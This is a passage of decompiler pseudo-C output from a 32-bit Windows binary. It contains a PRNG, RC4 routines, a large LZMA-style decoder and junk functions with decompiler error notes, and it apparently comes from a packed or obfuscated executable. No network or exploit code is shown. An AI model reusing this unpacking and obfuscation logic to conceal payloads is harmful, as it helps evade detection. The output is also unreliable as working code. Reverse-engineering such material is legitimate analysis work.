  LOBYTE(dword_439038) = dword_439038 + 18;
  LOBYTE(dword_439008) = -5;
  v1 = dword_43AC57 ^ (dword_43AC57 << 11);
  dword_43AC57 = dword_43AC3F;
  dword_439014 = a1;
  dword_43902C -= (int)&CreateFileA;
  dword_43AC3F = dword_43AC17;
  dword_43AC17 = dword_43AC3B;
  dword_43902C -= 2199;
  dword_439040 -= 27923;
  dword_43AC3B ^= (v1 >> 8) ^ v1 ^ ((unsigned int)dword_43AC3B >> 19);
  dword_43AADC = dword_43AC3B;
  return dword_43AC3B;
}
// 439008: using guessed type int dword_439008;
// 439014: using guessed type int dword_439014;
// 43902C: using guessed type int dword_43902C;
// 439038: using guessed type int dword_439038;
// 439040: using guessed type int dword_439040;
// 43AADC: using guessed type int dword_43AADC;
// 43AC17: using guessed type int dword_43AC17;
// 43AC3B: using guessed type int dword_43AC3B;
// 43AC3F: using guessed type int dword_43AC3F;
// 43AC57: using guessed type int dword_43AC57;

//----- (004068C3) --------------------------------------------------------
unsigned __int8 __cdecl sub_4068C3(_BYTE *a1, unsigned int a2, int a3)
{
  unsigned __int8 result; // al
  unsigned __int8 v4; // bl
  __int64 v5; // [esp-8h] [ebp-20h]
  _BYTE *i; // [esp+Ch] [ebp-Ch]
  unsigned int v7; // [esp+10h] [ebp-8h]
  unsigned __int8 v8; // [esp+17h] [ebp-1h]

  v4 = *(_BYTE *)(a3 + 256);
  v8 = *(_BYTE *)(a3 + 257);
  v7 = 0;
  for ( i = a1; v7 < a2; ++i )
  {
    v4 = (v4 + 1) % 256;
    v8 += *(_BYTE *)(a3 + v4);
    HIDWORD(v5) = a3 + v8;
    LODWORD(v5) = a3 + v4;
    sub_407231(v5);
    *i ^= *(_BYTE *)(a3 + (unsigned __int8)(*(_BYTE *)(a3 + v8) + *(_BYTE *)(a3 + v4)));
    ++v7;
  }
  *(_BYTE *)(a3 + 256) = v4;
  result = v8;
  *(_BYTE *)(a3 + 257) = v8;
  return result;
}

//----- (00407231) --------------------------------------------------------
__int64 __cdecl sub_407231(__int64 a1)
{
  __int64 result; // rax
  char v2; // cl

  result = a1;
  v2 = *(_BYTE *)a1;
  *(_BYTE *)a1 = *(_BYTE *)HIDWORD(a1);
  *(_BYTE *)HIDWORD(a1) = v2;
  return result;
}

//----- (0040787F) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __userpurge sub_40787F@<eax>(bool a1@<cf>, unsigned int a2@<eax>, unsigned int a3@<edx>, unsigned int *a4@<ecx>, _DWORD *a5@<ebp>, unsigned int a6@<edi>, int a7@<esi>, int a8, int a9, int a10)
{
  unsigned int v10; // eax
  unsigned int *v11; // edi
  int v12; // edx
  bool v13; // zf
  int v14; // edx
  int v15; // ebx
  int v16; // edx
  unsigned int *v17; // edx
  int v18; // ecx
  unsigned int v19; // eax
  unsigned int *v20; // edi
  char v21; // dl
  int v22; // edx
  int v23; // edi
  int v24; // ecx
  unsigned int v25; // edx
  unsigned int v26; // esi
  unsigned int v27; // ecx
  unsigned int v28; // esi
  int v29; // ebx
  int v30; // edi
  bool v31; // sf
  bool v32; // of
  int v33; // edx
  int v34; // ecx
  int v35; // edx
  int v36; // ecx
  unsigned int v37; // edx
  int v38; // edi
  unsigned int v39; // eax
  unsigned int *v40; // edx
  int v41; // ecx
  unsigned int v42; // ecx
  unsigned int v43; // esi
  unsigned int v44; // eax
  int v45; // esi
  unsigned int *v46; // ecx
  unsigned int v47; // edi
  unsigned int v48; // edi
  int v49; // ecx
  unsigned int v50; // ecx
  unsigned int v51; // ebx
  unsigned int v52; // esi
  int v53; // ecx
  bool v54; // cc
  int v55; // ecx
  unsigned int v56; // ecx
  int v57; // ebx
  int v58; // edi
  int v59; // ecx
  int v60; // ecx
  int v61; // ecx
  int v62; // ecx
  unsigned int v63; // edi
  int v64; // esi
  int v65; // edi
  int v66; // ebx
  char *v67; // ecx
  unsigned int v68; // eax
  int v69; // edx
  unsigned int v70; // eax
  unsigned int *v71; // edx
  int v72; // ecx
  int v73; // edx
  int v74; // edx
  int v76; // ecx
  int v77; // ecx
  int v78; // ecx
  unsigned int *v79; // edi
  unsigned int v80; // ecx
  int v81; // ecx
  unsigned int v82; // esi
  unsigned int v83; // ecx
  unsigned int v84; // edi
  unsigned int v85; // edi
  bool v86; // cc
  int v87; // edi
  unsigned int v88; // ebx
  int v89; // ecx
  unsigned int v90; // ecx
  unsigned int v91; // edi
  unsigned int v92; // edi
  unsigned int v93; // eax
  unsigned int v94; // ecx
  unsigned int v95; // edx
  unsigned int v96; // ecx
  unsigned int v97; // edi
  int v98; // edx
  int v99; // edx
  unsigned int *v100; // edi
  int v101; // ecx
  unsigned int v102; // ecx
  unsigned int v103; // edx
  unsigned int v104; // edx
  int v105; // esi
  int v106; // ecx
  unsigned int v107; // edx
  int v108; // esi

LABEL_1:
  if ( a1 )
  {
    v93 = a6;
    a4[1] = a3 + ((2048 - a3) >> 5);
    v78 = (int)&a4[8 * a7 + 130];
    *(a5 - 9) = 8;
    goto LABEL_57;
  }
  a5[3] -= a6;
  v93 = a2 - a6;
  a4[1] = a3 - (a3 >> 5);
  v78 = (int)(a4 + 258);
  *(a5 - 9) = 16;
  for ( *(a5 - 8) = 8; ; *(a5 - 8) = 3 )
  {
    *(a5 - 11) = *(a5 - 8);
    v29 = 1;
    do
    {
      if ( v93 < 0x1000000 )
      {
        v99 = *(unsigned __int8 *)*(a5 - 2) | (a5[3] << 8);
        v93 <<= 8;
        ++*(a5 - 2);
        a5[3] = v99;
      }
      v103 = *(_DWORD *)(v78 + 4 * v29);
      v82 = v103 * (v93 >> 11);
      if ( a5[3] >= v82 )
      {
        a5[3] -= v82;
        v93 -= v82;
        *(_DWORD *)(v78 + 4 * v29) = v103 - (v103 >> 5);
        v29 = 2 * v29 + 1;
      }
      else
      {
        v93 = v103 * (v93 >> 11);
        *(_DWORD *)(v78 + 4 * v29) = v103 + ((2048 - v103) >> 5);
        v29 *= 2;
      }
      v13 = (*(a5 - 11))-- == 1;
    }
    while ( !v13 );
    v14 = 1;
    v15 = *(a5 - 9) - (1 << *(a5 - 8)) + v29;
    v54 = *(a5 - 3) < 4;
    *(a5 - 12) = v15;
    if ( !v54 )
    {
      v23 = *(a5 - 5);
      goto LABEL_90;
    }
    *(a5 - 3) += 7;
    v62 = v15 >= 4 ? 3 : v15;
    v87 = (v62 << 8) + a5[4] + 1728;
    *(a5 - 11) = 6;
    do
    {
      if ( v93 < 0x1000000 )
      {
        v61 = *(unsigned __int8 *)*(a5 - 2) | (a5[3] << 8);
        v93 <<= 8;
        ++*(a5 - 2);
        a5[3] = v61;
      }
      v42 = *(_DWORD *)(v87 + 4 * v14);
      v43 = v42 * (v93 >> 11);
      if ( a5[3] >= v43 )
      {
        a5[3] -= v43;
        v93 -= v43;
        *(_DWORD *)(v87 + 4 * v14) = v42 - (v42 >> 5);
        v14 = 2 * v14 + 1;
      }
      else
      {
        v93 = v42 * (v93 >> 11);
        *(_DWORD *)(v87 + 4 * v14) = v42 + ((2048 - v42) >> 5);
        v14 *= 2;
      }
      v13 = (*(a5 - 11))-- == 1;
    }
    while ( !v13 );
    v12 = v14 - 64;
    v58 = v12;
    if ( v12 >= 4 )
    {
      v77 = (v12 >> 1) - 1;
      v30 = v12 & 1 | 2;
      *(a5 - 5) = v77;
      if ( v12 >= 14 )
      {
        v76 = (v12 >> 1) - 5;
        do
        {
          if ( v93 < 0x1000000 )
          {
            v73 = *(unsigned __int8 *)*(a5 - 2) | (a5[3] << 8);
            v93 <<= 8;
            ++*(a5 - 2);
            a5[3] = v73;
          }
          v93 >>= 1;
          v30 *= 2;
          if ( a5[3] >= v93 )
          {
            a5[3] -= v93;
            v30 |= 1u;
          }
          --v76;
        }
        while ( v76 );
        v57 = a5[4] + 3208;
        v58 = 16 * v30;
        *(a5 - 5) = 4;
      }
      else
      {
        v58 = v30 << v77;
        v57 = a5[4] + 4 * (v58 - v12) + 2748;
      }
      v59 = 1;
      *(a5 - 8) = v57;
      *(a5 - 9) = 1;
      do
      {
        if ( v93 < 0x1000000 )
        {
          v35 = *(unsigned __int8 *)*(a5 - 2) | (a5[3] << 8);
          v93 <<= 8;
          ++*(a5 - 2);
          a5[3] = v35;
        }
        v25 = *(_DWORD *)(v57 + 4 * v59);
        v26 = v25 * (v93 >> 11);
        if ( a5[3] >= v26 )
        {
          a5[3] -= v26;
          v57 = *(a5 - 8);
          v93 -= v26;
          v58 |= *(a5 - 9);
          *(_DWORD *)(v57 + 4 * v59) = v25 - (v25 >> 5);
          v59 = 2 * v59 + 1;
        }
        else
        {
          v93 = v25 * (v93 >> 11);
          *(_DWORD *)(v57 + 4 * v59) = v25 + ((2048 - v25) >> 5);
          v59 *= 2;
        }
        *(a5 - 9) *= 2;
        v13 = (*(a5 - 5))-- == 1;
      }
      while ( !v13 );
    }
    v23 = v58 + 1;
    *(a5 - 5) = v23;
    if ( !v23 )
      break;
    v15 = *(a5 - 12);
LABEL_90:
    v66 = v15 + 2;
    v67 = (char *)(a5[2] + *(a5 - 4) - v23);
    do
    {
      v21 = *v67;
      v64 = *(a5 - 4);
      v65 = a5[2];
      --v66;
      ++*(a5 - 4);
      ++v67;
      *((_BYTE *)a5 - 1) = v21;
      *(_BYTE *)(v64 + v65) = v21;
    }
    while ( v66 );
    while ( 1 )
    {
      while ( 1 )
      {
        a7 = *(a5 - 4) & 3;
        v20 = (unsigned int *)(a5[4] + 4 * (a7 + 16 * *(a5 - 3)));
        if ( v93 < 0x1000000 )
        {
          v72 = *(unsigned __int8 *)*(a5 - 2) | (a5[3] << 8);
          v93 <<= 8;
          ++*(a5 - 2);
          a5[3] = v72;
        }
        v50 = *v20;
        v51 = *v20 * (v93 >> 11);
        if ( a5[3] >= v51 )
          break;
        v52 = v50 + ((2048 - v50) >> 5);
        v53 = 3072 * *((unsigned __int8 *)a5 - 1);
        *v20 = v52;
        v22 = 1;
        v54 = *(a5 - 3) < 7;
        v55 = v53 + a5[4] + 7384;
        v93 = v51;
        *(a5 - 8) = v55;
        if ( !v54 )
        {
          *(a5 - 9) = *(unsigned __int8 *)(*(a5 - 4) - *(a5 - 5) + a5[2]);
          while ( 1 )
          {
            *(a5 - 9) *= 2;
            v45 = *(a5 - 9) & 0x100;
            v46 = (unsigned int *)(*(a5 - 8) + 4 * (v45 + v22) + 1024);
            *(a5 - 11) = v46;
            if ( v93 < 0x1000000 )
            {
              v38 = *(unsigned __int8 *)*(a5 - 2) | (a5[3] << 8);
              v93 <<= 8;
              ++*(a5 - 2);
              a5[3] = v38;
            }
            v96 = *v46;
            v97 = v96 * (v93 >> 11);
            if ( a5[3] >= v97 )
            {
              a5[3] -= v97;
              v93 -= v97;
              *(_DWORD *)*(a5 - 11) = v96 - (v96 >> 5);
              v22 = 2 * v22 + 1;
              if ( !v45 )
                goto LABEL_117;
            }
            else
            {
              v93 = v96 * (v93 >> 11);
              v22 *= 2;
              *(_DWORD *)*(a5 - 11) = v96 + ((2048 - v96) >> 5);
              if ( v45 )
                goto LABEL_117;
            }
            if ( v22 >= 256 )
              goto LABEL_118;
          }
        }
        do
        {
          v79 = (unsigned int *)(*(a5 - 8) + 4 * v22);
          if ( v93 < 0x1000000 )
          {
            v24 = *(unsigned __int8 *)*(a5 - 2) | (a5[3] << 8);
            v93 <<= 8;
            ++*(a5 - 2);
            a5[3] = v24;
          }
          v27 = *v79;
          v28 = *v79 * (v93 >> 11);
          if ( a5[3] >= v28 )
          {
            a5[3] -= v28;
            v93 -= v28;
            *v79 = v27 - (v27 >> 5);
            v22 = 2 * v22 + 1;
          }
          else
          {
            v93 = *v79 * (v93 >> 11);
            *v79 = v27 + ((2048 - v27) >> 5);
            v22 *= 2;
          }
LABEL_117:
          ;
        }
        while ( v22 < 256 );
LABEL_118:
        v105 = *(a5 - 4);
        v106 = a5[2];
        *(a5 - 4) = v105 + 1;
        v54 = *(a5 - 3) < 4;
        *((_BYTE *)a5 - 1) = v22;
        *(_BYTE *)(v105 + v106) = v22;
        if ( v54 )
        {
          *(a5 - 3) = 0;
        }
        else if ( (int)*(a5 - 3) >= 10 )
        {
          *(a5 - 3) -= 6;
        }
        else
        {
          *(a5 - 3) -= 3;
        }
      }
      a5[3] -= v51;
      v69 = *(a5 - 3);
      v70 = v93 - v51;
      *v20 = v50 - (v50 >> 5);
      v71 = (unsigned int *)(a5[4] + 4 * v69 + 768);
      if ( v70 < 0x1000000 )
      {
        v36 = *(unsigned __int8 *)*(a5 - 2) | (a5[3] << 8);
        v70 <<= 8;
        ++*(a5 - 2);
        a5[3] = v36;
      }
      v83 = *v71;
      v84 = *v71 * (v70 >> 11);
      if ( a5[3] < v84 )
        break;
      a5[3] -= v84;
      v68 = v70 - v84;
      *v71 = v83 - (v83 >> 5);
      v100 = (unsigned int *)(a5[4] + 4 * *(a5 - 3) + 816);
      if ( v68 < 0x1000000 )
      {
        v101 = *(unsigned __int8 *)*(a5 - 2) | (a5[3] << 8);
        v68 <<= 8;
        ++*(a5 - 2);
        a5[3] = v101;
      }
      v94 = *v100;
      v95 = *v100 * (v68 >> 11);
      if ( a5[3] >= v95 )
      {
        a5[3] -= v95;
        v19 = v68 - v95;
        v56 = v94 - (v94 >> 5);
        v16 = a5[4];
        *v100 = v56;
        v17 = (unsigned int *)(v16 + 4 * *(a5 - 3) + 864);
        if ( v19 < 0x1000000 )
        {
          v18 = *(unsigned __int8 *)*(a5 - 2) | (a5[3] << 8);
          v19 <<= 8;
          ++*(a5 - 2);
          a5[3] = v18;
        }
        v90 = *v17;
        v91 = *v17 * (v19 >> 11);
        if ( a5[3] >= v91 )
        {
          a5[3] -= v91;
          v39 = v19 - v91;
          *v17 = v90 - (v90 >> 5);
          v40 = (unsigned int *)(a5[4] + 4 * *(a5 - 3) + 912);
          if ( v39 < 0x1000000 )
          {
            v41 = *(unsigned __int8 *)*(a5 - 2) | (a5[3] << 8);
            v39 <<= 8;
            ++*(a5 - 2);
            a5[3] = v41;
          }
          v102 = *v40;
          v47 = v102 * (v39 >> 11);
          if ( a5[3] >= v47 )
          {
            a5[3] -= v47;
            v44 = v39 - v47;
            *v40 = v102 - (v102 >> 5);
            v49 = *(a5 - 10);
            *(a5 - 10) = *(a5 - 6);
          }
          else
          {
            v44 = v102 * (v39 >> 11);
            v48 = v102 + ((2048 - v102) >> 5);
            v49 = *(a5 - 6);
            *v40 = v48;
          }
          *(a5 - 6) = *(a5 - 7);
        }
        else
        {
          v44 = *v17 * (v19 >> 11);
          v92 = v90 + ((2048 - v90) >> 5);
          v49 = *(a5 - 7);
          *v17 = v92;
        }
        *(a5 - 7) = *(a5 - 5);
        *(a5 - 5) = v49;
        goto LABEL_21;
      }
      v88 = v94 + ((2048 - v94) >> 5);
      v89 = 16 * (*(a5 - 3) + 15);
      *v100 = v88;
      v10 = v95;
      v11 = (unsigned int *)(a5[4] + 4 * (a7 + v89));
      if ( v95 < 0x1000000 )
      {
        v10 = v95 << 8;
        v60 = *(unsigned __int8 *)(*(a5 - 2))++ | (a5[3] << 8);
        a5[3] = v60;
      }
      v80 = *v11;
      v107 = v80 * (v10 >> 11);
      if ( a5[3] >= v107 )
      {
        a5[3] -= v107;
        v44 = v10 - v107;
        *v11 = v80 - (v80 >> 5);
LABEL_21:
        *(a5 - 3) = *(a5 - 3) >= 7 ? 11 : 8;
        a4 = (unsigned int *)(a5[4] + 5328);
        goto LABEL_105;
      }
      v108 = *(a5 - 4);
      v93 = v80 * (v10 >> 11);
      v32 = __OFSUB__(*(a5 - 3), 7);
      v31 = *(a5 - 3) - 7 < 0;
      *v11 = v80 + ((2048 - v80) >> 5);
      v33 = a5[2];
      *(a5 - 3) = 2 * (v31 == v32) + 9;
      v34 = *(a5 - 4) - *(a5 - 5);
      ++*(a5 - 4);
      LOBYTE(v34) = *(_BYTE *)(v34 + v33);
      *((_BYTE *)a5 - 1) = v34;
      *(_BYTE *)(v108 + v33) = v34;
    }
    v44 = *v71 * (v70 >> 11);
    v85 = v83 + ((2048 - v83) >> 5);
    v86 = *(a5 - 3) < 7;
    *(a5 - 10) = *(a5 - 6);
    *(a5 - 6) = *(a5 - 7);
    v81 = *(a5 - 5);
    *v71 = v85;
    *(a5 - 7) = v81;
    if ( v86 )
      *(a5 - 3) = 0;
    else
      *(a5 - 3) = 3;
    a4 = (unsigned int *)(a5[4] + 3272);
LABEL_105:
    if ( v44 < 0x1000000 )
    {
      v98 = *(unsigned __int8 *)*(a5 - 2) | (a5[3] << 8);
      v44 <<= 8;
      ++*(a5 - 2);
      a5[3] = v98;
    }
    v37 = *a4;
    v63 = v37 * (v44 >> 11);
    if ( a5[3] >= v63 )
    {
      a5[3] -= v63;
      a2 = v44 - v63;
      v104 = v37 - (v37 >> 5);
      *a4 = v104;
      if ( a2 < 0x1000000 )
      {
        v74 = *(unsigned __int8 *)*(a5 - 2) | (a5[3] << 8);
        a2 <<= 8;
        ++*(a5 - 2);
        a5[3] = v74;
      }
      a3 = a4[1];
      a6 = a3 * (a2 >> 11);
      a1 = a5[3] < a6;
      goto LABEL_1;
    }
    v93 = v37 * (v44 >> 11);
    *(a5 - 9) = 0;
    *a4 = v37 + ((2048 - v37) >> 5);
    v78 = (int)&a4[8 * a7 + 2];
LABEL_57:
    ;
  }
  return *(a5 - 4);
}
// 406F38: positive sp value 4 has been found

//----- (00407C17) --------------------------------------------------------
int __cdecl sub_407C17(int a1, int a2, unsigned __int8 *a3)
{
  unsigned __int8 v3; // bl
  char v4; // cl
  unsigned int v5; // esi
  _BYTE *v6; // eax
  unsigned int i; // esi
  int result; // eax
  __int64 v9; // [esp-Ch] [ebp-1Ch]
  unsigned __int8 *v10; // [esp+8h] [ebp-8h]
  unsigned __int8 v11; // [esp+Fh] [ebp-1h]

  v5 = 0;
  v6 = a3;
  do
  {
    v4 = v5++;
    *v6++ = v4;
  }
  while ( v5 < 0x100 );
  a3[256] = 0;
  a3[257] = 0;
  v11 = 0;
  v3 = 0;
  v10 = a3;
  for ( i = 0; i < 0x100; ++i )
  {
    v3 = (v3 + *v10 + *(unsigned __int8 *)(a1 + v11)) % 256;
    HIDWORD(v9) = &a3[v3];
    LODWORD(v9) = &a3[i];
    sub_407231(v9);
    result = (v11 + 1) / a2;
    v11 = (v11 + 1) % a2;
    ++v10;
  }
  return result;
}

//----- (00407F6E) --------------------------------------------------------
#error "439AEE: positive sp value has been found (funcsize=27)"

//----- (00408057) --------------------------------------------------------
void sub_408057()
{
  __asm { retn }
}

//----- (0040A8C7) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_40A8C7(char a1@<al>, __int16 a2@<dx>, int a3@<ebx>, int a4@<ebp>, int _ESI@<esi>)
{
  __int16 v5; // ax

  *(_DWORD *)(a4 + 52) += a3;
  HIBYTE(v5) = -38;
  LOBYTE(v5) = a1 ^ 0xD5;
  __outdword(a2 - 1, v5);
  __asm { frstor  byte ptr [esi+65h] }
  JUMPOUT(0x40A8C6);
}
// 40A8C0: positive sp value 4 has been found
// 40A8C5: control flows out of bounds to 40A8C6

//----- (0040D45E) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall sub_40D45E@<eax>(char a1@<cl>, int a2@<esi>)
{
  void *retaddr[2]; // [esp+0h] [ebp+0h]

  *(_BYTE *)(a2 + 4) = -*(_BYTE *)(a2 + 4);
  MEMORY[0x2CC00570] = (char)MEMORY[0x2CC00570] >> a1;
  return MK_FP(retaddr[0], retaddr[0])();
}
// 40D465: positive sp value 4 has been found

//----- (00439ABB) --------------------------------------------------------
void __usercall sub_439ABB(int a1@<eax>, int a2@<edi>, int a3@<esi>)
{
  dword_439030 += dword_43A58C + a3;
  dword_439044 += 9577;
  dword_43900C = a2;
  dword_43AC03 = a1;
  dword_439040 = 3567;
  dword_439024 = *(&loc_439870 + 1) + a2;
  dword_439048 = a2 + 29608;
  JUMPOUT(0x439DE6);
}
// 439DE0: control flows out of bounds to 439DE6
// 43900C: using guessed type int dword_43900C;
// 439024: using guessed type int dword_439024;
// 439030: using guessed type int dword_439030;
// 439040: using guessed type int dword_439040;
// 439044: using guessed type int dword_439044;
// 439048: using guessed type int dword_439048;
// 43A58C: using guessed type int dword_43A58C;
// 43AC03: using guessed type int dword_43AC03;

// nfuncs=34 queued=33 decompiled=33 lumina nreq=0 worse=0 better=0
#error "There were 1 decompilation failure(s) on 33 function(s)"
